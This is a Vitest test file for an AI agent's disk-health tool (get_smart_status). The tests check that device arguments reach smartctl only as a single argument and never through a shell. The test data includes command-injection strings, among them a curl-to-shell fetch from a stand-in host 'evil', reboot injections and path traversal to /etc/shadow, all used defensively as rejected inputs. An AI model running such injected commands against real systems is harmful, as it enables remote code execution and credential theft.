import { describe, it, expect, vi, beforeEach, afterAll } from "vitest";
import { rmSync } from "node:fs";

vi.hoisted(() => {
  process.env.DATABASE_PATH = `${process.env.TMPDIR ?? "/tmp"}/talome-smart-status-${process.pid}.db`;
  process.env.TALOME_SECRET ||= "a".repeat(64);
});

afterAll(() => {
  for (const suffix of ["", "-wal", "-shm"]) rmSync(`${process.env.DATABASE_PATH}${suffix}`, { force: true });
});

// Record every process the tool would start; nothing real is spawned.
const calls = vi.hoisted(() => ({
  exec: [] as string[],
  execFile: [] as Array<{ file: string; args: string[] }>,
}));

vi.mock("node:child_process", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:child_process")>();
  type Callback = (err: Error | null, result?: { stdout: string; stderr: string }) => void;
  const lastCallback = (rest: unknown[]): Callback => rest.filter((a) => typeof a === "function").pop() as Callback;
  return {
    ...actual,
    exec: vi.fn((cmd: string, ...rest: unknown[]) => {
      calls.exec.push(cmd);
      lastCallback(rest)(null, { stdout: "{}", stderr: "" });
    }),
    execFile: vi.fn((file: string, args: string[], ...rest: unknown[]) => {
      calls.execFile.push({ file, args });
      const stdout = args.includes("--scan")
        ? JSON.stringify({ devices: [{ name: "/dev/sda", type: "sat", protocol: "ATA" }] })
        : JSON.stringify({ smart_status: { passed: true } });
      lastCallback(rest)(null, { stdout, stderr: "" });
    }),
  };
});

import { getSmartStatusTool, isValidSmartDevice } from "../ai/tools/storage-tools.js";

type Exec = (args: Record<string, unknown>, options: unknown) => Promise<Record<string, unknown>>;
const run = (args: Record<string, unknown>) =>
  (getSmartStatusTool as unknown as { execute: Exec }).execute(args, { toolCallId: "t", messages: [] });

beforeEach(() => {
  calls.exec.length = 0;
  calls.execFile.length = 0;
});

describe("get_smart_status", () => {
  it("never hands the device argument to a shell", async () => {
    for (const device of [
      "/dev/sda; touch /tmp/pwned",
      "/dev/sda && curl -s http://evil/x | sh",
      "/dev/sda`reboot`",
      "/dev/$(reboot)",
      "/dev/sda\nreboot",
      "--scan-open",
      "-a /etc/shadow",
      "/etc/shadow",
      "/dev/../etc/shadow",
      "sda",
    ]) {
      const r = await run({ device });
      expect(r.success, device).toBe(false);
      expect(String(r.error), device).toMatch(/Invalid device/);
    }
    expect(calls.exec).toEqual([]);
    expect(calls.execFile).toEqual([]);
  });

  it("runs smartctl with the device as a single argument", async () => {
    const r = await run({ device: "/dev/sda" });
    expect(r.success).toBe(true);
    expect(calls.exec).toEqual([]);
    expect(calls.execFile).toEqual([{ file: "smartctl", args: ["--json", "-a", "/dev/sda"] }]);
  });

  it("scans without a device", async () => {
    const r = await run({});
    expect(r.success).toBe(true);
    expect(calls.execFile).toEqual([{ file: "smartctl", args: ["--scan", "--json"] }]);
    expect(calls.exec).toEqual([]);
  });

  it("accepts real device names and rejects everything else", () => {
    for (const ok of ["/dev/sda", "/dev/nvme0n1", "/dev/disk0", "/dev/disk/by-id/ata-WDC_WD40EFRX-68N32N0_WD-WCC7K0", "/dev/disk/by-path/pci-0000:00:1f.2-ata-1", "/dev/mapper/vg0-data"]) {
      expect(isValidSmartDevice(ok), ok).toBe(true);
    }
    for (const bad of ["/dev/", "/dev/-a", "/dev/sda /dev/sdb", "/dev/sda|sh", "/dev/sda'", "/dev/../../etc/passwd"]) {
      expect(isValidSmartDevice(bad), bad).toBe(false);
    }
  });

  it("the input schema rejects shell syntax before the tool runs", () => {
    const schema = (getSmartStatusTool as unknown as { inputSchema: { safeParse: (v: unknown) => { success: boolean } } }).inputSchema;
    expect(schema.safeParse({ device: "/dev/sda; reboot" }).success).toBe(false);
    expect(schema.safeParse({ device: "/dev/sda" }).success).toBe(true);
    expect(schema.safeParse({}).success).toBe(true);
  });
});
